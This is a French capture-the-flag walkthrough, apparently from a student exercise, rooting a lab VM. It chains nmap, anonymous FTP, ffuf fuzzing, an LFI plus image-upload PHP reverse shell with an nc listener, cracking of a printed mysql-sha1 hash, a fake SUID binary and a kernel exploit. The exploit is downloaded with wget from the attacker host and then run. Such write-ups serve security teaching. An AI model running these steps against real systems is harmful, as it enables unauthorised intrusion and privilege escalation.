##### **<u>1. NMAP:</u>**

> sudo nmap -sSV -sC  -p- 192.168.52.131

- `-sV : Détection de version sur les services utilisé.`
- `-sS :  SYN Scan, scan plutôt furtif.`
- `-sC : Exécute une série de scripts sur les services trouvé.`
- `-p- : Scan tous les ports existant`

![image-20210325140435655](khennou.assets/image-20210325140435655.png)

On peut voir que le port 80(http) est ouvert et que le service ssh(25452) ainsi que ftp(61337) sont sur des ports différents.

Grâce aux scripts lancé par nmap, on peut constater que le partage ftp est autorise la connexion en utilisateur anonyme, de plus le ftp contient des fichiers visible sur le nmap.



##### **<u>2.FTP:</u>**

> ftp 192.168.52.131 61337

Name: Anonymous

Password: Anonymous

![image-20210325140634098](khennou.assets/image-20210325140634098.png)

Plusieurs fichiers sont contenu dans le ftp.

Exportons tous ça.

![image-20210325140716461](khennou.assets/image-20210325140716461.png)

Letter.txt :

![image-20210325140921027](khennou.assets/image-20210325140921027.png)

La seul information intéressante dans se fichier, est qu'il nous dis que les autres fichiers contiennent des logs.



auth.log :

Rien d'intéressant dans le fichier auth.log

![image-20210325140940162](khennou.assets/image-20210325140940162.png)



access.log :

Dans ce fichier on peut voir que des requêtes sont faite vers le serveur web, filtrons les requêtes uniquement réussis(réponse 200)

![image-20210325140852048](khennou.assets/image-20210325140852048.png)

> cat access.log | grep 200

On voit une requêtes vers un dossier avec un nom assez atypique, allons voir ça de plus prés.

![image-20210325141021971](khennou.assets/image-20210325141021971.png)

Nous voilà sur un page secret de l'ESGI, énumérons les sous dossier possible.

![image-20210325141200875](khennou.assets/image-20210325141200875.png)



##### **<u>3.FFUF:</u>**

> ffuf -w /usr/share/SecLists/Discovery/Web-Content/common.txt -u http://192.168.52.131/0cdb312366ecf1f493bc83f0fb56adda28125498762f28f1cc40c320300125ce/FUZZ

![image-20210325142635509](khennou.assets/image-20210325142635509.png)

On découvre un dossier uploads accessible.

Regardons ça de plus près.

![image-20210325142908575](khennou.assets/image-20210325142908575.png)

On trouve un index of dans ce dossier, si un dossier et nommé "uploads" c'est qu'il doit bien avoir un autre dossier ou l'on peut upload des fichiers.

Allons tester les extensions php.



> ffuf -w /usr/share/SecLists/Discovery/Web-Content/common-PHP-Filename.txt -u http://192.168.52.131/0cdb312366ecf1f493bc83f0fb56adda28125498762f28f1cc40c320300125ce/FUZZ

![image-20210325143147270](khennou.assets/image-20210325143147270.png)

2 dossier un upload.php (surement l'upload de fichier) et un language.php



upload.php :

Comme pensé un système d'upload testons d'injecter un reverse shell en php

![image-20210325143524222](khennou.assets/image-20210325143524222.png)

L'upload nous bloque les extensions php, revenons dessus plus tard et allons voir l'autre dossier

language.php :

![image-20210325143647788](khennou.assets/image-20210325143647788.png)

En regardant l'url on peut voir qu'il utilise des fichiers php, testons une attaque lfi.

![image-20210325143919115](khennou.assets/image-20210325143919115.png)

Pas d'erreur, tentons encore plusieurs retour en arrière(../)

![image-20210325143953557](khennou.assets/image-20210325143953557.png)

![image-20210325144007129](khennou.assets/image-20210325144007129.png)

Bingo, on peut donc bien exécuter des fichiers dessus.

![image-20210325144023406](khennou.assets/image-20210325144023406.png)

Etant donnée que cette page exécute du code php, si on upload une image contenant du code php il devrait l'executer.

![image-20210325144500368](khennou.assets/image-20210325144500368.png)

![image-20210325144513181](khennou.assets/image-20210325144513181.png)

Parfait vérifions dans le dossier upload.

![image-20210325144552958](khennou.assets/image-20210325144552958.png)

Débutons une écoute sur le port défini dans le reverse shell.

> nc -lnvp 4444

![image-20210325144655270](khennou.assets/image-20210325144655270.png)

Retournons dans language.php pour exécuter le reverse shell

![image-20210325144727610](khennou.assets/image-20210325144727610.png)

Etant donné que les deux dossiers sont dans le même répertoir il suffit de mettre le chemin /uploads/rev.php.jpg

![image-20210325145241927](khennou.assets/image-20210325145241927.png)

Nous voilà avec un shell sur l'utilisateur www-data.



##### <u>**4.PrivEsc:**</u>

Etant donnée qu'il existe des form php, cela nous permet de déduire qu'il y a une base de donnée vers qui le php envoi des requêtes(surement sql).

> find / -name *.sql -type f 2>/dev/null

![image-20210325145838691](khennou.assets/image-20210325145838691.png)

Nous voilà avec le mdp hash de l'utilisateur eguillemot.

![image-20210325150515663](khennou.assets/image-20210325150515663.png)

Avec hash-identifier on retrouve le hash utiliser,  mysql-sha1

![image-20210325150603801](khennou.assets/image-20210325150603801.png)

##### **<u>5.JOHN:</u>**

Stockons le mdp chiffré dans un fichier temporaire

> echo -n '*B38E48ED65DF090D475F5F25E030D183BC140ECD' > abc.txt

![image-20210325150705093](khennou.assets/image-20210325150705093.png)

Vérifions si john possède ce type de hash

> john --list=formats | grep mysql

![image-20210325150945541](khennou.assets/image-20210325150945541.png)

John le connais, parfait on peut donc tenter de trouver le mot de passe.

Etant donnée que je l'ai déjà fais il me dit que john le possède déjà dans ses fichiers.

> john --format=mysql-sha1 abc.txt

![image-20210325150903799](khennou.assets/image-20210325150903799.png)

Nous voilà avec le mot de passe de l'utilisateur guillemot qui est esgi.

![image-20210325151130554](khennou.assets/image-20210325151130554.png)

Nous voilà connecté sur le user eguillemot

![image-20210325151317178](khennou.assets/image-20210325151317178.png)

Premier flag:

![image-20210325235345486](khennou.assets/image-20210325235345486.png)

Tentons maintenant d'accéder à l'utilisateur khennou.

> find / -perm /4000 -user khennou 2>/dev/null

![image-20210325224352025](khennou.assets/image-20210325224352025.png)

Grâce à la command find et son option -perm 4000 on sait qu'il y a un sticky bit sur la commande whois.

En exécutant whois, on aperçoit que rien ne s'affiche, or la commande par défaut affiche au moins une erreur, cela veut dire que ce n'est pas la vrais commande whois.

![image-20210325224437698](khennou.assets/image-20210325224437698.png)

Exportant le binaire sur la notre machine pour voir exactement ce qu'elle fait.



Analyse static:

En utilisant l'outil cutter et sont outils décompiler on voit qu'elle exécute  un shell bash avec l'id de l'utilisateur(khennou dans notre cas), on voit de plus qu'il fait une comparaison entre l'adresse var_24h et s2.

![image-20210325224601590](khennou.assets/image-20210325224601590.png)

Analyse dinamique:

Sur gdb on vois qu'il compare les varables rsi ainsi que rdi, le code est affiché en clair dans la variable rsi (étant donné que rdi est notre input).

![image-20210325224716557](khennou.assets/image-20210325224716557.png)

Nous voilà maintenant avec l'utilisateur khennou.

![image-20210325224528692](khennou.assets/image-20210325224528692.png)

En regarde les droits sudo, on voit que cet utilisateur  possède les droits root sans mot de passe.

![image-20210325225203274](khennou.assets/image-20210325225203274.png)

2ème flag:

![image-20210325235317154](khennou.assets/image-20210325235317154.png)





Surprise:

En récupérant la version du kernel et en faisant un searchsploit on voit qu'elle est vulnérable.

![image-20210326160337182](khennou.assets/image-20210326160337182.png)

![image-20210326161141971](khennou.assets/image-20210326161141971.png)

La cve nous renvois vers le script suivant:

www.halfdog.net/Misc/Utils/UserNamespaceExec.c

Compiler le code c

> gcc UserNamespaceExec.c -o UserNamespaceExec

![image-20210326163713912](khennou.assets/image-20210326163713912.png)

On ouvre un server web afin de récupérer le script sur la machine distante

> wget 192.168.52.128:8000/UserNamespaceExec

![image-20210326164835851](khennou.assets/image-20210326164835851.png)

> chmod +x UserNamespace

Rendre le script exécutable

![image-20210326165659822](khennou.assets/image-20210326165659822.png)

> ./UserNamespaceExec -- /bin/bash

![image-20210326165929574](khennou.assets/image-20210326165929574.png)